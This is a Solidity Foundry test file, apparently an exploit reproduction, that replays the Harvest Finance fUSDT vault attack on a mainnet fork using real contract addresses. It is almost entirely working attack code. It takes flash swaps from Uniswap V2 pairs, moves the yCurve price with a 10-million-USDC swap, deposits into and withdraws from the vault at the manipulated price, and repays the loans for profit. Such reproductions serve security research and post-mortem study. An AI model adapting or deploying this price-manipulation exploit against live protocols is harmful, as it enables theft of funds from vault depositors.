
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/HarvestFF/interfaces/IFlashLoanReceiver.sol";
import "../src/HarvestFF/interfaces/IERC20.sol";


interface HVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 numberOfShares) external;
    function balanceOf(address account) external view returns (uint256);
}

interface yCurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface UniSwapV2 {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    function swap(
    uint256 amount0Out,
    uint256 amount1Out,
    address to,
    bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

// fork_block_number = 11128720
contract ExploitTest is Test {
    // ethAddress
    address constant ETH_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    // HVault
    HVault constant FARM_USDT = HVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    
    // CurveStrategy
    address constant CURVE_STRATEGY = 0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c;
    
    // yCurve
    yCurve constant Y_CURVE = yCurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);

    IUniswapV2Pair constant uUSDT = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair constant uUSDC = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    IUSDT constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function run() public {
        testExploit();
    }

    function setUp() public {
        USDC.approve(address(uUSDC), ~uint256(0));
        USDC.approve(address(FARM_USDT), ~uint256(0));
        USDC.approve(address(Y_CURVE), ~uint256(0));


        USDT.approve(address(uUSDT), ~uint256(0));
        USDT.approve(address(FARM_USDT), ~uint256(0));
        USDT.approve(address(Y_CURVE), ~uint256(0));
    }

    function testExploit() public {
        emit log_named_string("[+]", "flash loan");
        emit log_named_address("exploit contract", address(this));
        emit log_named_uint("exploit balance", USDC.balanceOf(address(this)));
        emit log_named_string("\n", "");

        // 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e test
        emit log_named_decimal_uint("pool check loan", USDC.balanceOf(address(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e)), 6);

        uint amount = 10000000 * 1e6;
        emit log_named_decimal_uint("uniswap pair amount", amount, 6);
        
        uUSDC.swap(
            amount,
            0,
            address(this),
            hex"00"
        );
        // profit
        emit log_named_decimal_uint("\nprofit", USDC.balanceOf(address(this)), 6);
    }

 
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        if (address(msg.sender) == address(uUSDT)) {
            emit log("uniswapV2Call");

            emit log_named_decimal_uint("USDT balance 2", USDT.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("USDC balance 2", USDC.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("FARM_USDT_UNIV 2",FARM_USDT.balanceOf(address(this)), 6);
            emit log_named_string("\n", "");
            
            // USDT -> USDC
            Y_CURVE.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);

            emit log_named_decimal_uint("USDT balance 2-2", USDT.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("USDC balance 2-2", USDC.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("FARM_USDT_UNIV 2-2",FARM_USDT.balanceOf(address(this)), 6);
            emit log_named_string("\n", "");

            FARM_USDT.withdraw(FARM_USDT.balanceOf(address(this)));

            emit log_named_decimal_uint("USDT balance 2-3", USDT.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("USDC balance 2-3", USDC.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("FARM_USDT_UNIV 2-3",FARM_USDT.balanceOf(address(this)), 6);
            emit log_named_string("\n", "");
            
            emit log_named_decimal_uint("amounts fee", amount1 * 1.00301 ether / 1 ether, 6);
            USDT.transfer(address(uUSDT), amount1 * 1.00301 ether / 1 ether);
            
        } else if (address(msg.sender) == address(uUSDC)) {
            emit log_named_string("", "uniswap handling");
            emit log_named_address("sender", sender);
            emit log_named_decimal_uint("amount0", amount0, 6);
            emit log_named_decimal_uint("amount1", amount1, 6);
            
            emit log_named_decimal_uint("USDT balance 0", USDT.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("USDC balance 0", USDC.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("FARM_USDT_UNIV 0",FARM_USDT.balanceOf(address(this)), 6);
            emit log_named_string("\n", "");

            // USDC -> USDT
            Y_CURVE.exchange_underlying(1, 2, 10000000 * 1e6, 0);

            uint256 usdtBalance = USDT.balanceOf(address(this));
            emit log_named_decimal_uint("USDT balance 1", USDT.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("USDC balance 1", USDC.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("FARM_USDT_UNIV 1",FARM_USDT.balanceOf(address(this)), 6);
            emit log_named_string("\n", "");
            
            FARM_USDT.deposit(USDT.balanceOf(address(this)));

            emit log_named_decimal_uint("USDT balance 1-1", USDT.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("USDC balance 1-1", USDC.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("FARM_USDT_UNIV 1-1",FARM_USDT.balanceOf(address(this)), 6);
            emit log_named_string("\n", "");

            // flash swap USDT
            uUSDT.swap(0, usdtBalance, address(this), hex"00");

            emit log_named_decimal_uint("USDT balance 3", USDT.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("USDC balance 3", USDC.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("FARM_USDT_UNIV 3",FARM_USDT.balanceOf(address(this)), 6);
            emit log_named_string("\n", "");

            Y_CURVE.exchange_underlying(2, 1, USDT.balanceOf(address(this)), 0);
            
            emit log_named_decimal_uint("final USDT balance", USDT.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("final USDC balance", USDC.balanceOf(address(this)), 6);
            emit log_named_decimal_uint("FARM_USDT_UNIV final",FARM_USDT.balanceOf(address(this)), 6);
            emit log_named_string("\n", "");
            USDC.transfer(address(uUSDC), amount0 * 1.00301 ether / 1 ether);
        }
    }

    receive() payable external {}
}
